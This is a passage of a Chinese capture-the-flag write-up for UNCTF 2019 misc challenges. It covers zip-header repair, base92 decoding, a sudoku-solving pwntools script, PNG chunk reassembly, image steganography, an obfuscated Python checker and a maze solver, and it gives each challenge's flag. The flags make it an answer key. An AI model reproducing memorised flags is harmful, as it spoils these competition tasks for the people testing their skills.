<h2 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h2><h4 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h4><p>​         快乐游戏题 </p>
<h4 id="Analyze-10"><a href="#Analyze-10" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        玩游戏就完事了</p>
<h4 id="Solve-10"><a href="#Solve-10" class="headerlink" title="Solve"></a>Solve</h4><p><img src="https://i.loli.net/2019/10/30/ot4YrT56GOMhSux.jpg" alt></p>
<h4 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;c783910550de39816d1de0f103b0ae32&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Hidden-secret"><a href="#Hidden-secret" class="headerlink" title="Hidden secret"></a>Hidden secret</h2><h4 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h4><p>​        unctf_Hidden secret 题目下载链接更新为： 链接：<a href="https://pan.baidu.com/s/125zN2324w-lV8ASXfa5zYw" target="_blank" rel="noopener">https://pan.baidu.com/s/125zN2324w-lV8ASXfa5zYw</a> 提取码：psp2 hint:no NTFS,easier </p>
<h4 id="Analyze-11"><a href="#Analyze-11" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        开头得到三个文件，但是看到文件头<code>03 04</code>、<code>01 02</code>、<code>05 06</code>，就知道是去掉了504B的zip文件，加上后拼接得到zip，解压得到一张图。</p>
<p><img src="/2019/10/30/UNCTF_wp/C:%5CUsers%5Clijin%5CDesktop%5Cwp%5C%E9%99%84%E4%BB%B6%5C%E9%99%84%E4%BB%B6%5Coutput%5Cjpg%5C00000000.jpg" alt></p>
<p>​        起始一开始是NTFS隐写，但是emmm题目出错了，后面就简单的加了个zip文件，解压后得到一个txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K&lt;jslc7b5&apos;gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#</span><br></pre></td></tr></table></figure>

<p>​        然后各种编码猜测，最后锁在了base64+的编码里，然后因为@和]两个字符确定是base92的编码，然后python里解密一把梭得到flag</p>
<h4 id="Solve-11"><a href="#Solve-11" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base92</span><br><span class="line">print(base92.decode(<span class="string">"K&lt;jslc7b5'gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\\X#9YhiSHV#"</span>))</span><br></pre></td></tr></table></figure>

<h4 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;cca1a567c3145b1801a4f3273342c622&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h2><h4 id="Description-12"><a href="#Description-12" class="headerlink" title="Description"></a>Description</h4><pre><code>unctf_EasyBox </code></pre><h4 id="Analyze-12"><a href="#Analyze-12" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        nc上去后是数独题，根据题目来解题,算法是参考的网上 <a href="https://blog.csdn.net/zonnin/article/details/78813698" target="_blank" rel="noopener">https://blog.csdn.net/zonnin/article/details/78813698</a> ，但是里面有</p>
<h4 id="Solve-12"><a href="#Solve-12" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10011</span>)</span><br><span class="line">d = p.recvuntil(<span class="string">'row '</span>).decode().split(<span class="string">'\n'</span>)[<span class="number">-20</span>:<span class="number">-1</span>]</span><br><span class="line">da = []</span><br><span class="line"><span class="comment">#将数独转化成列表形式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(d)/<span class="number">2</span>)):</span><br><span class="line">    da.append(d[<span class="number">2</span>*i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(da)):</span><br><span class="line">    da[i]=da[i].split(<span class="string">'|'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(da)):</span><br><span class="line">    <span class="keyword">del</span> da[i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">del</span> da[i][<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(da[i])):</span><br><span class="line">        <span class="keyword">if</span> da[i][j]==<span class="string">' '</span>:</span><br><span class="line">            da[i][j] = <span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(da)):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(len(da[x])):</span><br><span class="line">        da[x][y] = int(da[x][y])</span><br><span class="line">    <span class="comment">#     print(da[x][y],end=' ')</span></span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_done</span><span class="params">(s)</span>:</span><span class="comment">#是否结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">in</span> [<span class="number">0</span> <span class="keyword">in</span> r <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row</span><span class="params">(s,r)</span>:</span><span class="comment">#获得行数据</span></span><br><span class="line">    <span class="keyword">return</span> s[r]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column</span><span class="params">(s,c)</span>:</span><span class="comment">#获得列数据</span></span><br><span class="line">    <span class="keyword">return</span> [r[c]<span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">possible</span><span class="params">(s,r,c)</span>:</span><span class="comment">#是否可行</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)\</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_row(s,r)</span><br><span class="line">            <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_column(s,c)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go_around</span><span class="params">(s)</span>:</span><span class="comment">#解数独</span></span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> index_r,r <span class="keyword">in</span> enumerate(s):</span><br><span class="line">        row = []</span><br><span class="line">        <span class="keyword">for</span> indew_c,c <span class="keyword">in</span> enumerate(r):</span><br><span class="line">            <span class="keyword">if</span> c == <span class="number">0</span>:</span><br><span class="line">                maybe_ans = possible(s,index_r,indew_c)</span><br><span class="line">                row.append(maybe_ans[<span class="number">0</span>] <span class="keyword">if</span> len(maybe_ans) == <span class="number">1</span>\</span><br><span class="line">                                        <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                row.append(c)</span><br><span class="line">        ans.append(row)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_sudoku</span><span class="params">(s, msg=<span class="string">'1'</span>)</span>:</span><span class="comment">#打印数独</span></span><br><span class="line">    print(msg)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> s:</span><br><span class="line">        print(<span class="string">" "</span>.join([str(c) <span class="keyword">for</span> c <span class="keyword">in</span> r]))</span><br><span class="line">    print(<span class="string">"*"</span>*<span class="number">18</span>)</span><br><span class="line">n_da = da</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> not_done(n_da):</span><br><span class="line">    n_da = go_around(n_da)</span><br><span class="line">    print_sudoku(n_da)</span><br><span class="line"></span><br><span class="line">sendl = <span class="string">''</span></span><br><span class="line"><span class="comment"># print(da)</span></span><br><span class="line"><span class="comment"># print(n_da)</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(da)):<span class="comment">#将0的部分发送</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(len(da[x])):</span><br><span class="line">        <span class="keyword">if</span> da[x][y] == <span class="number">0</span>:</span><br><span class="line">            sendl+=str(n_da[x][y])+<span class="string">','</span></span><br><span class="line">    p.recvuntil(<span class="string">'answer :'</span>)</span><br><span class="line">    p.sendline(sendl[:<span class="number">-1</span>])</span><br><span class="line">    sendl = <span class="string">''</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b613e841e0822e2925376d5373cbfbc4&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Happy-puzzle"><a href="#Happy-puzzle" class="headerlink" title="Happy_puzzle"></a>Happy_puzzle</h2><h4 id="Description-13"><a href="#Description-13" class="headerlink" title="Description"></a>Description</h4><p>​         Happy_puzzle 签到人的又一力作 hint1: png吧 hint2：data不是图片，要拼图 hint3：idat数据块 </p>
<h4 id="Analyze-13"><a href="#Analyze-13" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        根据hint得知是idat的数据块，于是写脚本拼接完整的png图片，一层一层的idat爆破出来(半自动脚本。。。</p>
<h4 id="Solve-13"><a href="#Solve-13" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">head= bytearray.fromhex(<span class="string">'89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 01 90 00 00 01 90 08 02 00 00 00 00 00 00 00'</span>.replace(<span class="string">' '</span>,<span class="string">''</span>))</span><br><span class="line">idata = bytearray.fromhex(<span class="string">'00 00 28 00 49 44 41 54'</span>.replace(<span class="string">' '</span>,<span class="string">''</span>))</span><br><span class="line">crc = bytearray.fromhex(<span class="string">'00000000'</span>)</span><br><span class="line">end = bytearray.fromhex(<span class="string">'00 00 00 00 49 45 4E 44 AE 42 60 82'</span>.replace(<span class="string">' '</span>,<span class="string">''</span>))</span><br><span class="line"></span><br><span class="line">dir = <span class="string">r'f\puzzle'</span></span><br><span class="line">data_name = os.listdir(dir)</span><br><span class="line"></span><br><span class="line">w1 = open(<span class="string">r'f\puzzle\res\11.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">data1 = w1.read()</span><br><span class="line">w1.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dir)):</span><br><span class="line">    path = os.path.join(dir, data_name[i])</span><br><span class="line">    <span class="keyword">if</span> path[<span class="number">-5</span>:]==<span class="string">'.data'</span>:</span><br><span class="line">        a = open(path,<span class="string">'rb'</span>)</span><br><span class="line">        da = a.read()</span><br><span class="line">        a.close()</span><br><span class="line">        data = data1+idata+da+crc</span><br><span class="line">        b = open(<span class="string">'res\\'</span>+str(i)+<span class="string">'.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line">        b.write(data)</span><br><span class="line">        b.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/30/KQFW2aJb6M3PXIm.jpg" alt></p>
<h4 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;312bbd92c1v291e1827ba519326b6688&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h2><h4 id="Description-14"><a href="#Description-14" class="headerlink" title="Description"></a>Description</h4><p>​         信号不好我先挂了。 Flag交不上，多换几种格式。 </p>
<h4 id="Analyze-14"><a href="#Analyze-14" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        开局一张图<img src="/2019/10/30/UNCTF_wp/C:%5CUsers%5Clijin%5CDesktop%5Cwp%5CUNCTF%5C1910185da99b29db8f4%5Capple.png" alt></p>
<p>​        然后丢进Stegsolve分析，发现<img src="https://i.loli.net/2019/10/30/Ho2pjIgLrc6qXYy.jpg" alt></p>
<p><img src="https://i.loli.net/2019/10/30/T8SUoCxOKWsu9gD.jpg" alt></p>
<p><img src="https://i.loli.net/2019/10/30/olIYOu8cFL6JfA7.jpg" alt></p>
<p>​        易得是一个LSB隐写，继续解密后得到一个zip，解压后得到另一个图片<img src="https://i.loli.net/2019/10/30/XMglTYDjOPWxk8a.png" alt></p>
<p>​        把这个也丢进stegsolve中分析，得到</p>
<p><img src="https://i.loli.net/2019/10/30/EbRZy7odUHwqSD8.jpg" alt></p>
<p>​        有一些条纹，然后又有两张图，易得是盲水印隐写，最后得到flag</p>
<h4 id="Solve-14"><a href="#Solve-14" class="headerlink" title="Solve"></a>Solve</h4><p><img src="https://i.loli.net/2019/10/30/Sf73hGXPrliHAT2.png" alt></p>
<h4 id="flag-14"><a href="#flag-14" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;9d0649505b702643&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h2><h4 id="Description-15"><a href="#Description-15" class="headerlink" title="Description"></a>Description</h4><p>​        Think </p>
<h4 id="Analyze-15"><a href="#Analyze-15" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        打开一个网页，看到</p>
<p><img src="https://i.loli.net/2019/10/30/aw7DSPLfigQW3n8.jpg" alt></p>
<p>​        看到里面有个checknum，想着改成1会怎么样，然后。。。就得到flag了</p>
<h4 id="Solve-15"><a href="#Solve-15" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">  ____   ___  _  ___    _   _ _   _  ____ _____ _____</span></span><br><span class="line"><span class="string"> |___ \ / _ \/ |/ _ \  | | | | \ | |/ ___|_   _|  ___|</span></span><br><span class="line"><span class="string">   __) | | | | | (_) | | | | |  \| | |     | | | |_</span></span><br><span class="line"><span class="string">  / __/| |_| | |\__, | | |_| | |\  | |___  | | |  _|</span></span><br><span class="line"><span class="string"> |_____|\___/|_|  /_/   \___/|_| \_|\____| |_| |_|</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">lambda</span> __y, __operator, __g, __print: [[[[(__print(<span class="string">"It's a simple question. Take it easy. Don't think too much about it."</span>), [(check(<span class="number">1</span>), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'check'</span>], check.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> checknum: (<span class="keyword">lambda</span> __l: [(<span class="keyword">lambda</span> __after: (__print(<span class="string">'Congratulation!'</span>), (__print(decrypt(key, encrypted)), __after())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">if</span> __l[<span class="string">'checknum'</span>] <span class="keyword">else</span> (__print(<span class="string">'Wrong!'</span>), __after())[<span class="number">1</span>])(<span class="keyword">lambda</span>: <span class="literal">None</span>) <span class="keyword">for</span> __l[<span class="string">'checknum'</span>] <span class="keyword">in</span> [(checknum)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">'check'</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'decrypt'</span>], decrypt.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> key, encrypted: (<span class="keyword">lambda</span> __l: [[(<span class="keyword">lambda</span> __after, __sentinel, __items: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[__this() <span class="keyword">for</span> __l[<span class="string">'c'</span>] <span class="keyword">in</span> [(__operator.iadd(__l[<span class="string">'c'</span>], chr((ord(__l[<span class="string">'key'</span>][(__l[<span class="string">'i'</span>] % len(__l[<span class="string">'key'</span>]))]) ^ ord(__l[<span class="string">'encrypted'</span>][__l[<span class="string">'i'</span>]].decode(<span class="string">'base64'</span>).decode(<span class="string">'hex'</span>))))))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">'i'</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(next(__items, __sentinel)))())(<span class="keyword">lambda</span>: __l[<span class="string">'c'</span>], [], iter(range(len(__l[<span class="string">'encrypted'</span>])))) <span class="keyword">for</span> __l[<span class="string">'c'</span>] <span class="keyword">in</span> [(<span class="string">''</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">'key'</span>], __l[<span class="string">'encrypted'</span>] <span class="keyword">in</span> [(key, encrypted)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">'decrypt'</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'encrypted'</span>] <span class="keyword">in</span> [([<span class="string">'MTM='</span>, <span class="string">'MDI='</span>, <span class="string">'MDI='</span>, <span class="string">'MTM='</span>, <span class="string">'MWQ='</span>, <span class="string">'NDY='</span>, <span class="string">'NWE='</span>, <span class="string">'MDI='</span>, <span class="string">'NGQ='</span>, <span class="string">'NTI='</span>, <span class="string">'NGQ='</span>, <span class="string">'NTg='</span>, <span class="string">'NWI='</span>, <span class="string">'MTU='</span>, <span class="string">'NWU='</span>, <span class="string">'MTQ='</span>, <span class="string">'MGE='</span>, <span class="string">'NWE='</span>, <span class="string">'MTI='</span>, <span class="string">'MDA='</span>, <span class="string">'NGQ='</span>, <span class="string">'NWM='</span>, <span class="string">'MDE='</span>, <span class="string">'MTU='</span>, <span class="string">'MDc='</span>, <span class="string">'MTE='</span>, <span class="string">'MGM='</span>, <span class="string">'NTA='</span>, <span class="string">'NDY='</span>, <span class="string">'NTA='</span>, <span class="string">'MTY='</span>, <span class="string">'NWI='</span>, <span class="string">'NTI='</span>, <span class="string">'NDc='</span>, <span class="string">'MDI='</span>, <span class="string">'NDE='</span>, <span class="string">'NWU='</span>, <span class="string">'MWU='</span>])]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">'key'</span>] <span class="keyword">in</span> [(<span class="string">'unctf'</span>)]][<span class="number">0</span>])((<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span>: y(y)()))), __import__(<span class="string">'operator'</span>, level=<span class="number">0</span>), globals(), __import__(<span class="string">'__builtin__'</span>, level=<span class="number">0</span>).__dict__[<span class="string">'print'</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/30/UNCTF_wp/C:%5CUsers%5Clijin%5CDesktop%5Cwp%5CUNCTF_wp%5CTIM%E6%88%AA%E5%9B%BE20191026231726.jpg" alt></p>
<h4 id="flag-15"><a href="#flag-15" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34a94868a8ad9ff82baadb326c513d40&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h2><h4 id="Description-16"><a href="#Description-16" class="headerlink" title="Description"></a>Description</h4><p>​         宁就是HSY？ 答案提交UNCTF{flag}。 </p>
<h4 id="Analyze-16"><a href="#Analyze-16" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        开局一个mp3，丢到HxD中看，后面有个zip的，foremost后得到一个加密的zip，然后看见文件最后的qqqmusic于是去QQ音乐找了下原曲，发现评论中</p>
<p><img src="https://i.loli.net/2019/10/30/tN1VHmpzCkcrueG.jpg" alt></p>
<p>​        于是解压，然后图片里又有一个zip（其实应该是word），然后在里面找到了flag的图片</p>
<h4 id="Solve-16"><a href="#Solve-16" class="headerlink" title="Solve"></a>Solve</h4><p><img src="/2019/10/30/UNCTF_wp/C:%5CUsers%5Clijin%5CDesktop%5Cwp%5CUNCTF%5C1910185da99b27ee2a1%5Coutput%5Czip%5Coutput%5Czip%5C00000092%5Cword%5Cmedia%5Cimage1.png" alt></p>
<h4 id="flag-16"><a href="#flag-16" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;W3_L0v3_Unctf&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="无限迷宫"><a href="#无限迷宫" class="headerlink" title="无限迷宫"></a>无限迷宫</h2><h4 id="Description-17"><a href="#Description-17" class="headerlink" title="Description"></a>Description</h4><p>​         啊哈，来走迷宫试试看啊，很简单的，哈哈哈哈哈哈。 Hint1:图片大小 Hint2:上下左右，1234 Hint3:密码高达几百位，请勿爆破 Hint4:128层，停止手工尝试 Hint5:题目没有其他解法，和你心里想的其实是一样的 Hint6:重申停止手工尝试，迷宫不是给人走的 答案提交flag{}括号内的值。 </p>
<h4 id="Analyze-17"><a href="#Analyze-17" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        是人出的题？（出题人出来挨打），意思很明白，脚本解迷宫再解压，其他都在脚本备注里</p>
<h4 id="Solve-17"><a href="#Solve-17" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">999999</span>)<span class="comment"># 递归层数</span></span><br><span class="line"></span><br><span class="line">step = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">useful</span><span class="params">(maze, x, y)</span>:</span><span class="comment"># 判断是否为有效的区域内</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt; len(maze) <span class="keyword">and</span> y &gt;= <span class="number">0</span> <span class="keyword">and</span> y &lt; len(maze[<span class="number">0</span>]) <span class="keyword">and</span> maze[x][y] == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">walk</span><span class="params">(mg, x, y, ex, ey)</span>:</span><span class="comment"># 网上找的迷宫递归代码=。=</span></span><br><span class="line">    <span class="keyword">global</span> step</span><br><span class="line">    <span class="keyword">if</span> x == ex <span class="keyword">and</span> y == ey:</span><br><span class="line">        step.append((x, y))</span><br><span class="line">        solve(step)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> useful(mg, x, y):</span><br><span class="line">        step.append((x, y))</span><br><span class="line">        mg[x][y] = <span class="number">2</span></span><br><span class="line">        walk(mg, x, y + <span class="number">1</span>, ex, ey)</span><br><span class="line">        walk(mg, x, y - <span class="number">1</span>, ex, ey)</span><br><span class="line">        walk(mg, x - <span class="number">1</span>, y, ex, ey)</span><br><span class="line">     